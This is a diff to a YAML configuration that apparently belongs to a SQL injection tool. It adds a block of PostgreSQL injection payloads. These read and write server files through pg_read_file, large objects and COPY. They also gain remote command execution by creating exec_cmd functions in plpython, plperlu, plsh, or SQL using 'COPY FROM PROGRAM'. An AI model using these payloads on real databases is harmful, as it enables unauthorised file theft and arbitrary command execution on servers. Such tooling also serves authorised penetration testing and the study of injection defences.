@@ -112,8 +112,54 @@ resource:
     field: trim(coalesce(${field.value}::text, ''))
     concat: "|| '%7f' ||"
 
- file:
-  read: pg_read_file('${filepath}')
+ exploit: |
+  file:
+   read:
+    fromDataFolder: pg_read_file('${filepath}')
+    largeObject:
+     fromPath: SELECT lo_import('%s')::text
+     toText: SELECT convert_from(lo_get(%s),'utf8')::text
+    fromTempTable: array_to_string(array(select * from %s),'\n')
+   write:
+    largeObject:
+     fromText: SELECT lo_from_bytea(0, '%s')::text
+     toFile: SELECT lo_export(%s, '%s')::text
+    tempTable:
+     drop: ;drop table %s;
+     add: ;create table %s(data text);
+     fill: ;copy %s(data) from '%s' delimiter E'\x01';
+  
+  rce:
+   extension:
+    create: ;CREATE EXTENSION %s;
+    languages: select array_to_string(array(select lanname FROM pg_language),'')
+   # drop both functions from sql and other extensions
+   dropFunc: ;DROP function exec_cmd(text);DROP function exec_cmd();
+   runFunc: SELECT exec_cmd('%s')||'%s'
+   plpython: |
+    ; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%%20$$%%0a
+    from subprocess import check_output as c %%0a
+    return c(cmd).decode() %%0a
+    $$%%20LANGUAGE %s;
+   plperlu: |
+    ; CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;
+   plsh: |
+    ; CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS text AS '%23!/bin/sh%0a$1' LANGUAGE plsh;
+   sql:
+    dropTable: ;DROP TABLE IF EXISTS cmd_result;
+    createTable: ;Create table cmd_result (str text);
+    confirm:
+     # unused signature arg and return text to avoid function duplicate
+     addFunc: ;Create Or Replace Function exec_cmd(cmd TEXT) RETURNS void As%20$$%0acopy cmd_result from program 'echo%20"13""37"'%0a$$%20language sql;
+     funcExists: SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'
+    resultCmd: select array_to_string(array(select str FROM cmd_result),'\n')||'%s'
+    runCmd: ;select exec_cmd('');
+    clean: ;delete from cmd_result;
+    runFunc: ;Create Or Replace Function exec_cmd(cmd TEXT) RETURNS void As%%20$$%%0acopy cmd_result from program '%s'%%0a$$%%20language sql;
+  
+  shell:
+   confirmWeb: echo "iamin$((133707330+1))"
+   confirmSql: select 1337
 
 strategy:
  configuration:
